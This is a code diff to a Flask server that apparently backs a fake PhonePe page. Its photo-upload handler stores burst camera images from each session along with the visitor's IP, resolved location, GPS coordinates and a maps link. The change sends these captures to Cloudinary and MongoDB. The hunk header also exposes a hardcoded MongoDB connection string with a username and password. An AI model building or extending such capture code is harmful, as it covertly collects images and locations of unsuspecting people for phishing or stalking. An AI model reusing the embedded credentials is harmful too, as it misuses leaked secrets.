@@ -78,13 +78,22 @@ MONGO_URI = os.environ.get('MONGO_URI', 'mongodb+srv://surajorg48:RkEwKhSN2vKkYu
 db = None
 if MONGO_URI:
     try:
-        client = MongoClient(MONGO_URI)
+        # Add timeouts to prevent the UI from hanging if DB is slow
+        client = MongoClient(
+            MONGO_URI, 
+            serverSelectionTimeoutMS=2000, # 2 seconds max wait
+            connectTimeoutMS=2000,
+            retryWrites=True
+        )
         db = client['phonepe_captures']
+        # Quick check if connection is actually working
+        client.admin.command('ping')
         logger.info("✅ MongoDB Atlas connected successfully")
     except Exception as e:
-        logger.error(f"❌ MongoDB connection failed: {e}")
+        logger.error(f"⚠️ MongoDB connection issue (App will use local backup): {e}")
+        db = None # Fallback to local
 else:
-    logger.warning("⚠️  MONGO_URI not set. Metadata will be saved locally (ephemeral).")
+    logger.warning("⚠️  MONGO_URI not set. Metadata will be saved locally.")
 
 
 @app.get("/health")
@@ -701,41 +710,61 @@ def upload_single_photo():
         try:
             image_data = photo.split(',')[1] if ',' in photo else photo.replace('data:image/jpeg;base64,', '')
             image_bytes = base64.b64decode(image_data)
-            ts_ms = int(time.time() * 1000)
-            safe_index = int(index) if str(index).isdigit() else 0
-            filename = f"{burst_type}_{safe_index}_{ts_ms}.jpg"
-            photo_path = os.path.join(burst_dir, filename)
-            with open(photo_path, 'wb') as f:
-                f.write(image_bytes)
+            
+            if CLOUDINARY_CLOUD_NAME:
+                # Upload to Cloudinary
+                public_id = f"phonepe/{session_id}/{burst_type}/p_{index}_{int(time.time())}"
+                upload_result = cloudinary.uploader.upload(
+                    image_bytes,
+                    public_id=public_id,
+                    folder=f"phonepe/{session_id}/{burst_type}"
+                )
+                filename = upload_result.get('secure_url')
+                is_cloud = True
+            else:
+                ts_ms = int(time.time() * 1000)
+                safe_index = int(index) if str(index).isdigit() else 0
+                local_name = f"{burst_type}_{safe_index}_{ts_ms}.jpg"
+                photo_path = os.path.join(burst_dir, local_name)
+                with open(photo_path, 'wb') as f:
+                    f.write(image_bytes)
+                filename = os.path.join(burst_type, local_name)
+                is_cloud = False
         except Exception:
-            logger.exception('Failed to decode/save photo')
+            logger.exception('Failed to save photo')
             return jsonify({'success': False, 'error': 'Failed to save photo'}), 500
 
-        # Optionally write/update a lightweight uploads log
+        # Update uploads log
         try:
             log_path = os.path.join(session_dir, 'uploads_log.json')
             log = []
             if os.path.exists(log_path):
-                with open(log_path, 'r') as f:
-                    try:
-                        log = json.load(f)
-                    except Exception:
-                        log = []
+                try:
+                    with open(log_path, 'r') as f: log = json.load(f)
+                except: log = []
+            
             entry = {
                 'burst': burst_type,
-                'filename': os.path.join(burst_type, filename),
+                'filename': filename,
+                'is_cloud': is_cloud,
                 'timestamp': datetime.now().isoformat(),
                 'ip': ip_address,
                 'resolved_location': accurate_location,
                 'client_geo': {'latitude': lat, 'longitude': lon, 'accuracy_meters': accuracy, 'maps_url': maps_url}
             }
             log.append(entry)
-            with open(log_path, 'w') as f:
-                json.dump(log, f, indent=2)
-        except Exception:
-            logger.warning('Could not update uploads log for session %s', session_id)
+            with open(log_path, 'w') as f: json.dump(log, f, indent=2)
+            
+            # Also update MongoDB on every photo if possible
+            if db is not None:
+                db.sessions.update_one(
+                    {'session_id': session_id},
+                    {'$push': {'captured_files': entry}},
+                    upsert=True
+                )
+        except Exception: pass
 
-        return jsonify({'success': True, 'session_id': session_id, 'burst': burst_type, 'filename': os.path.join(burst_type, filename), 'maps_url': maps_url})
+        return jsonify({'success': True, 'session_id': session_id, 'filename': filename})
     except Exception:
         logger.exception('upload_single_photo error')
         return jsonify({'success': False, 'error': 'Server error'}), 500
